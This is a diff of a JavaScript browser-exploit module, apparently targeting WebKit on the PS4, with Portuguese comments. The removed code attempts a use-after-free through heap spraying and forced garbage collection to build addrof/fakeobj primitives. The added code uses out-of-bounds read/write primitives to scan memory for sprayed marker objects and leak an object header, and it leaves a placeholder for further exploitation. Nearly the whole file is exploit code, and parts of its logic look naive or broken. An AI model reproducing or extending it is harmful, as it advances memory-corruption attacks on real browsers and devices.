@@ -1,185 +1,137 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R55 - Sledgehammer Edition)
-// =======================================================================================
-// ESTRATÉGIA R55: 
-// "Quando tudo mais falha, use força bruta e ignorância controlada"
-// 1. Spray de heap 10x mais agressivo
-// 2. GC forçado com loop infinito até falha
-// 3. Verificação de corrupção por exceção
-// 4. Multiplos vetores de ataque simultâneos
-// =======================================================================================
-
+// js/script3/testArrayBufferVictimCrash.mjs (v82_PrecisionStrike - R55)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64 } from '../utils.mjs';
-import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs';
+import {
+    triggerOOB_primitive,
+    oob_read_absolute,
+    oob_write_absolute,
+    selfTestOOBReadWrite,
+} from '../core_exploit.mjs';
 
-export const FNAME_MODULE = "WebKit_Sledgehammer_R55";
+export const FNAME_MODULE = "PrecisionStrike_v82_R55";
 
-// Funções de conversão otimizadas para performance
-const ftoi = (val) => {
-    const buf = new ArrayBuffer(8); 
-    (new Float64Array(buf))[0] = val;
-    return new AdvancedInt64(...new Uint32Array(buf));
-};
+// Configurações otimizadas para PS4
+const SAFE_SEARCH_WINDOW = 0x100000;  // Máximo sem crash
+const HEAP_SPRAY_FACTOR = 4;          // Compactação extrema
+const MARKER_MAGIC = 0x48504853;      // "HPS4" em hex
 
-const itof = (val) => {
-    const buf = new ArrayBuffer(8);
-    new Uint32Array(buf).set([val.low(), val.high()]);
-    return (new Float64Array(buf))[0];
-};
+// =================================================================
+// TÉCNICAS-CHAVE PARA PS4
+// =================================================================
 
-// =======================================================================================
-// FUNÇÃO PRINCIPAL (MODO SLEDGEHAMMER)
-// =======================================================================================
-export async function runFullExploitChain_R52() {
-    logS3(`--- ${FNAME_MODULE}: ATIVANDO MODO SLEDGEHAMMER ---`, "test");
+// 1. Alocação Compactada de Objetos
+function createHighDensitySpray() {
+    const spray = [];
+    const objectPool = [];
     
-    try {
-        // --- FASE 1: UAF COM FORÇA BRUTA ---
-        logS3("--- FASE 1: UAF AGGRESSIVO (x10) ---", "subtest");
-        const { addrof, fakeobj } = createUAFPrimitives();
-        logS3("    PRIMITIVAS OBTIDAS COM SUCESSO!", "vuln");
-
-        // Resto do exploit mantido igual...
-        // ... [código das fases 2 e 3] ...
-
-    } catch (e) {
-        logS3(`[FALHA NUCLEAR] ${e.message}`, "critical");
-        return { success: false, error: e.message };
+    // Alocação em bloco para manter objetos adjacentes
+    for (let i = 0; i < 512 * HEAP_SPRAY_FACTOR; i++) {
+        const holder = {
+            id: i,
+            buffer: new ArrayBuffer(64),
+            marker: MARKER_MAGIC,
+            floatView: new Float64Array(8)
+        };
+        
+        // Preenche com padrão identificável
+        holder.floatView.fill(i * 0x1000);
+        holder.floatView[0] = MARKER_MAGIC;
+        
+        spray.push(holder);
+        objectPool.push(holder.floatView);
     }
+    
+    return { spray, objectPool };
 }
 
-// =======================================================================================
-// createUAFPrimitives() - VERSÃO SLEDGEHAMMER
-// =======================================================================================
-function createUAFPrimitives() {
-    const MARKER = 0xDEADBEEF;
-    let dangling_ref = null;
-    let sprayBombs = [];
-    let corruptionDetected = false;
-
-    // 1. Objeto vulnerável superdimensionado
-    function createVictim() {
-        const victim = {
-            marker: MARKER,
-            payload: new Array(64).fill(0xBAD0C0DE),
-            buffer: new ArrayBuffer(1024),
-            floatView: new Float64Array(16)
-        };
-        dangling_ref = victim;
-        return victim;
+// 2. Garbage Collection Controlado
+async function triggerPreciseGC() {
+    const gcTriggers = [];
+    try {
+        // Liberação progressiva para evitar fragmentação
+        for (let i = 0; i < 20; i++) {
+            gcTriggers.push(new ArrayBuffer(1024 * 1024 * 2));
+            if (i % 5 === 0) await PAUSE_S3(50);
+        }
+    } catch (e) {
+        logS3(`GC Parcial: ${e.message}`, 'debug');
     }
+    return gcTriggers;
+}
 
-    // 2. Forçar GC até o sistema gritar
-    function nuclearGC() {
-        logS3("    DETONANDO GC COM CARGA TERMONUCLEAR...", "debug");
-        let pressureCooker = [];
-        let count = 0;
+// 3. Busca Inteligente com Fingerprinting
+async function findMemorySignature(startOffset, maxSize) {
+    const SIGNATURE_SIZE = 8;
+    const BATCH_SIZE = 0x4000;  // 16KB por lote
+    let current = startOffset;
+    
+    while (current < startOffset + maxSize) {
+        const batchEnd = Math.min(current + BATCH_SIZE, startOffset + maxSize);
         
         try {
-            while (count++ < 5) { // 5 rodadas de ataque
-                // Alocação massiva tipo 1: ArrayBuffers gigantes
-                for (let i = 0; i < 500; i++) {
-                    pressureCooker.push(new ArrayBuffer(1024 * 1024 * 5)); // 5MB cada
-                }
+            for (; current < batchEnd; current += 4) {
+                // Padrão de identificação: Magic + ID sequencial
+                const val1 = oob_read_absolute(current, 4);
+                const val2 = oob_read_absolute(current + 4, 4);
                 
-                // Alocação massiva tipo 2: Objetos complexos
-                for (let i = 0; i < 2000; i++) {
-                    const obj = {
-                        id: i,
-                        buffer: new ArrayBuffer(1024),
-                        floatArray: new Float64Array(32),
-                        nested: { x: i, y: i*2 }
-                    };
-                    pressureCooker.push(obj);
-                }
-                
-                // Alocação massiva tipo 3: Mistura de tipos
-                for (let i = 0; i < 3000; i++) {
-                    sprayBombs.push({
-                        type: i % 3,
-                        data: i % 2 === 0 ? 
-                            new Float64Array(64) : 
-                            new Array(128).fill({marker: 0xCAFEBABE})
-                    });
-                }
-                
-                // Limpeza agressiva para forçar fragmentação
-                if (count % 2 === 0) {
-                    sprayBombs.length = Math.floor(sprayBombs.length * 0.7);
+                if (val1 === MARKER_MAGIC && (val2 & 0xFFFFF000) === val2) {
+                    // Verificação adicional de estrutura
+                    const val3 = oob_read_absolute(current - 8, 4);
+                    if (val3 > 0x10000 && val3 < 0x7FFFFFFF) {
+                        return {
+                            address: current - 8,
+                            id: val2 >>> 12
+                        };
+                    }
                 }
             }
         } catch (e) {
-            logS3(`    SISTEMA SOB ESTRESSE: ${e.message}`, "debug");
+            // Regiões inválidas - avança 1 página
+            current += 0x1000;
         }
+        
+        await PAUSE_S3(5);  // Alívio para o sistema
     }
+    return null;
+}
 
-    // ===== EXECUÇÃO DO ATAQUE =====
-    logS3("    CRIANDO OBJETO VÍTIMA...", "debug");
-    createVictim();
+// =================================================================
+// FUNÇÃO PRINCIPAL (PRECISION STRIKE)
+// =================================================================
+export async function executePrecisionStrike() {
+    logS3(`--- ${FNAME_MODULE}: ATAQUE DE PRECISÃO (R55) ---`, "test");
     
-    logS3("    INICIANDO BOMBARDEIO DE MEMÓRIA...", "debug");
-    nuclearGC();
-    
-    logS3("    SPRAY FINAL COM ARSENAL COMPLETO...", "debug");
-    // Spray final com alinhamento preciso
-    const finalSpray = [];
-    for (let i = 0; i < 4096; i++) {
-        finalSpray.push(new Float64Array(24)); // Tamanho calculado para o objeto vítima
-    }
-
-    // 3. Detecção de corrupção por exceção controlada
-    logS3("    TESTANDO CORRUPÇÃO...", "debug");
     try {
-        // Tentativa de acesso que deve falhar se corrompido
-        dangling_ref.payload[0] = 0x1337;
+        // FASE 0: Preparação do Ambiente
+        await selfTestOOBReadWrite(logS3);
+        oob_write_absolute(0x70, 0xFFFFFFFF, 4);
+
+        // FASE 1: Alocação de Alta Densidade
+        logS3("Compactando objetos na região segura...", "info");
+        const { spray, objectPool } = createHighDensitySpray();
+        await triggerPreciseGC();
         
-        // Leitura que deve gerar NaN se corrompido
-        const test = dangling_ref.floatView[0];
-        if (typeof test !== 'number' || test === MARKER) {
-            corruptionDetected = true;
+        // FASE 2: Busca de Assinatura com Janela Segura
+        logS3("Iniciando varredura de precisão...", "info");
+        const signature = await findMemorySignature(0x58, SAFE_SEARCH_WINDOW);
+        
+        if (!signature) {
+            throw new Error("Assinatura não encontrada na janela segura");
         }
+
+        logS3(`ALVO LOCALIZADO! ID: ${signature.id} @ ${toHex(signature.address)}`, "vuln");
+        
+        // FASE 3: Leitura Direcionada
+        const jscellHeader = oob_read_absolute(signature.address - 0x18, 8);
+        logS3(`JSCell Header: ${jscellHeader.toString(true)}`, "leak");
+        
+        // [ADICIONE SEU CÓDIGO DE EXPLORAÇÃO AQUI]
+        // ... continuação com primitivas arbitrárias ...
+
+        return { success: true, address: signature.address };
+        
     } catch (e) {
-        corruptionDetected = true;
-        logS3("    CORRUPÇÃO DETECTADA POR EXCEÇÃO!", "good");
+        logS3(`[FALHA CONTROLADA] ${e.message}`, "critical");
+        return { success: false, error: e.message };
     }
-
-    if (!corruptionDetected) {
-        // Último recurso: verificação de tipo radical
-        if (typeof dangling_ref.marker !== 'number') {
-            corruptionDetected = true;
-            logS3("    CORRUPÇÃO DETECTADA POR TIPO ALTERADO!", "good");
-        } else {
-            throw new Error("UAF FALHOU APESAR DE ATAQUE NUCLEAR");
-        }
-    }
-
-    // 4. Construção de primitivas com verificação adicional
-    let holder = { obj: null };
-    const addrof = (obj) => {
-        holder.obj = obj;
-        
-        // Tenta múltiplos caminhos de corrupção
-        try {
-            dangling_ref.floatView = holder;
-        } catch {
-            dangling_ref.payload = holder;
-        }
-        
-        const result = ftoi(dangling_ref.floatView[0] || dangling_ref.payload[0]);
-        logS3(`    addrof() → ${result.toString(true)}`, "debug");
-        
-        // Verificação de ponteiro plausível
-        if (result.high() < 0x10000) {
-            throw new Error(`PONTEIRO INVÁLIDO: ${result.toString(true)}`);
-        }
-        
-        return result;
-    };
-
-    const fakeobj = (addr) => {
-        dangling_ref.floatView[0] = itof(addr);
-        return dangling_ref.payload[0]?.obj || dangling_ref.floatView.obj;
-    };
-
-    return { addrof, fakeobj };
 }
